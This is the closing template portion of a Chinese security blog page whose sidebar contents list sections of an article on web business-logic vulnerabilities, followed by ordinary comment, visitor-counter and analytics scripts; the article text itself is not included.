+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/01/WEB安全之文件包含漏洞学习实战/" rel="next" title="WEB安全之文件包含漏洞学习实战">
+                <i class="fa fa-chevron-left"></i> WEB安全之文件包含漏洞学习实战
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/29/WEB 安全之通用安全防御 WAF 系统搭建与学习/" rel="prev" title="WEB 安全之通用安全防御 WAF 系统搭建与学习">
+                WEB 安全之通用安全防御 WAF 系统搭建与学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="SOHUCS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="Darren-zl">
+            
+              <p class="site-author-name" itemprop="name">Darren-zl</p>
+              <p class="site-description motion-element" itemprop="description">一天一小步，随着时间的积累，你将会发现你其实已经走了很远。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Darren-zl" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/p/1005052390784733/home?from=page_100505&mod=TAB&pids=plc_main" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#业务逻辑漏洞收集"><span class="nav-number">1.</span> <span class="nav-text">业务逻辑漏洞收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-验证码回传"><span class="nav-number">1.1.</span> <span class="nav-text">1.验证码回传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Cookie-amp-session"><span class="nav-number">1.2.</span> <span class="nav-text">2.Cookie&amp;session</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-会话固定攻击"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 会话固定攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#获取sessionID方式："><span class="nav-number">1.2.1.0.1.</span> <span class="nav-text">获取sessionID方式：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-基于cookie的攻击与防御"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 基于cookie的攻击与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#cookie的攻击方式："><span class="nav-number">1.2.2.0.1.</span> <span class="nav-text">cookie的攻击方式：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#获取cookie信息的主要途径："><span class="nav-number">1.2.2.0.2.</span> <span class="nav-text">获取cookie信息的主要途径：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#什么样的cookie可以被利用："><span class="nav-number">1.2.2.0.3.</span> <span class="nav-text">什么样的cookie可以被利用：</span></a></li></ol></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#3-业务安全一致性"><span class="nav-number">1.3.</span> <span class="nav-text">3.业务安全一致性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-邮箱用户名修改"><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1 邮箱用户名修改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-订单ID修改"><span class="nav-number">1.3.2.</span> <span class="nav-text">3.2 订单ID修改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-商品编号修改"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.3 商品编号修改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-用户ID篡改"><span class="nav-number">1.3.4.</span> <span class="nav-text">3.4 用户ID篡改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-5-支付漏洞"><span class="nav-number">1.3.5.</span> <span class="nav-text">3.5 支付漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-6-认证凭证空值绕过："><span class="nav-number">1.3.6.</span> <span class="nav-text">3.6 认证凭证空值绕过：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-7-response校验不合规"><span class="nav-number">1.3.7.</span> <span class="nav-text">3.7 response校验不合规</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-业务数据串改"><span class="nav-number">1.4.</span> <span class="nav-text">4.业务数据串改</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-最大数限制突破"><span class="nav-number">1.4.1.</span> <span class="nav-text">4.1 最大数限制突破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-本地js参数修改"><span class="nav-number">1.4.2.</span> <span class="nav-text">4.2 本地js参数修改</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-返回短信验证码"><span class="nav-number">1.5.</span> <span class="nav-text">5.返回短信验证码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Token设计不合理相关漏洞"><span class="nav-number">1.6.</span> <span class="nav-text">6. Token设计不合理相关漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-业务流程乱序-顺序执行缺陷"><span class="nav-number">1.7.</span> <span class="nav-text">7.业务流程乱序-顺序执行缺陷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-内容编辑"><span class="nav-number">1.8.</span> <span class="nav-text">8.内容编辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-时效绕过漏洞"><span class="nav-number">1.9.</span> <span class="nav-text">9. 时效绕过漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#时间刷新缺陷："><span class="nav-number">1.9.0.1.</span> <span class="nav-text">时间刷新缺陷：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章："><span class="nav-number">1.10.</span> <span class="nav-text">参考文章：</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Darren-zl</span>
+
+  
+</div>
+
+
+  <!--<div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>-->
+
+
+
+ <!-- <span class="post-meta-divider">|</span>-->
+
+
+
+  <!--<div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>-->
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  <div class="bg_content">
+    <canvas id="canvas"></canvas>
+</div>
+
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+    <script type="text/javascript">
+    (function(){
+      var appid = 'cytxCyGhU';
+      var conf = '90b283bdb7ccb472f325f3c891156b33';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+        window.changyan.api.config({appid:appid,conf:conf})});
+      }
+    })();
+    </script>
+    <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+  
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("29xnQ1C2kcwORHYYn7xsWTnS-gzGzoHsz", "Rq1Gk75oRwH78BryWUL4oYzj");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+</body>
+</html>
